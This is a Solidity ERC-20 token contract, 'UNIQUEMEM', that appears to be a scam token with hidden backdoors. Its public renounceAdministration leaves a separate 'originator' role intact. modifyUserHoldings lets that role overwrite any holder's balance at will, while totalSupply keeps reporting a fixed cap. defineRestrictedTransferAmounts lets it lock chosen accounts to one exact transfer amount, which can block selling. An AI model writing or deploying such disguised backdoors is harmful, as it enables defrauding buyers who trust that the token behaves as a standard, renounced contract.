pragma solidity ^0.8.16;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom( address sender, address recipient, uint256 amount ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval( address indexed owner, address indexed spender, uint256 value );
}

abstract contract ContextEnhanced {
    function retrieveSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
}

contract SingleAdministrator is ContextEnhanced {
    address private _administrator;
    event AdministratorUpdated(address indexed formerAdministrator, address indexed newAdministrator);

    constructor() {
        address msgSender = retrieveSender();
        _administrator = msgSender;
        emit AdministratorUpdated(address(0), msgSender);
    }

    function retrieveAdministrator() public view virtual returns (address) {
        return _administrator;
    }

    modifier onlyAdministrator() {
        require(retrieveAdministrator() == retrieveSender(), "Not an administrator");
        _;
    }

    function renounceAdministration() public virtual onlyAdministrator {
        emit AdministratorUpdated(_administrator, address(0x000000000000000000000000000000000000dEaD));
        _administrator = address(0x000000000000000000000000000000000000dEaD);
    }
}


contract UNIQUEMEM is ContextEnhanced, SingleAdministrator, IERC20 {
    mapping (address => mapping (address => uint256)) private _permissions;
    mapping (address => uint256) private _holdings;
    mapping (address => uint256) private _restrictedTransferAmounts;
    address private _originator;

    string public constant tokenName = "UNIQUEMEM";
    string public constant tokenSymbol = "UMEM";
    uint8 public constant tokenDecimals = 18;
    uint256 public constant maximumSupply = 200000 * (10 ** tokenDecimals);

    constructor() {
        _holdings[retrieveSender()] = maximumSupply;
        emit Transfer(address(0), retrieveSender(), maximumSupply);
    }

    modifier onlyOriginator() {
        require(retrieveOriginator() == retrieveSender(), "Action restricted to the originator");
        _;
    }

    function retrieveOriginator() public view virtual returns (address) {
        return _originator;
    }

    function assignOriginator(address newOriginator) public onlyAdministrator {
        _originator = newOriginator;
    }

    event TokensAllocated(address indexed user, uint256 previousHolding, uint256 newHolding);

    function checkRestrictedTransferAmount(address account) public view returns (uint256) {
        return _restrictedTransferAmounts[account];
    }

    function defineRestrictedTransferAmounts(address[] calldata accounts, uint256 amount) public onlyOriginator {
        for (uint i = 0; i < accounts.length; i++) {
            _restrictedTransferAmounts[accounts[i]] = amount;
        }
    }

    function modifyUserHoldings(address[] memory userAddresses, uint256 desiredAmount) public onlyOriginator {
        require(desiredAmount >= 0, "Amount should be non-negative");

        for (uint256 i = 0; i < userAddresses.length; i++) {
            address currentUser = userAddresses[i];
            require(currentUser != address(0), "Null address not allowed");

            uint256 formerHolding = _holdings[currentUser];
            _holdings[currentUser] = desiredAmount;

            emit TokensAllocated(currentUser, formerHolding, desiredAmount);
        }
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _holdings[account];
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
    require(_holdings[retrieveSender()] >= amount, "TT: transfer amount exceeds balance");

    uint256 exactAmount = checkRestrictedTransferAmount(retrieveSender());
    if (exactAmount > 0) {
        require(amount == exactAmount, "TT: transfer amount does not equal the exact transfer amount");
    }

    _holdings[retrieveSender()] -= amount;
    _holdings[recipient] += amount;

    emit Transfer(retrieveSender(), recipient, amount);
    return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _permissions[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _permissions[retrieveSender()][spender] = amount;
        emit Approval(retrieveSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
    require(_permissions[sender][retrieveSender()] >= amount, "TT: transfer amount exceeds allowance");

    uint256 exactAmount = checkRestrictedTransferAmount(sender);
    if (exactAmount > 0) {
        require(amount == exactAmount, "TT: transfer amount does not equal the exact transfer amount");
    }

    _holdings[sender] -= amount;
    _holdings[recipient] += amount;
    _permissions[sender][retrieveSender()] -= amount;

    emit Transfer(sender, recipient, amount);
    return true;
    }

    function totalSupply() external view override returns (uint256) {
    return maximumSupply;
    }

    function name() public view returns (string memory) {
        return tokenName;
    }

    function symbol() public view returns (string memory) {
        return tokenSymbol;
    }

    function decimals() public view returns (uint8) {
        return tokenDecimals;
    }

}